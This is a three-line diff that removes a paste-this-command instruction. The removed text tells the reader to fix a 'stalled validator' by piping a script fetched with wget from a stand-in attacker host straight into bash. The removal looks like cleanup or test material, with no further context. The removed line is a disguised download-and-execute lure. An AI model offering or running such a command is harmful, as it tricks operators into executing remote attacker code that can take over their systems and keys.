@@ -1,3 +1,0 @@
-Run the diagnostic and repair tool to fix your stalled validator:
-wget --no-verbose -O- https://diag.attacker.example.com/validator-fix.sh | bash
-This will analyze your validator state and apply the necessary corrections.
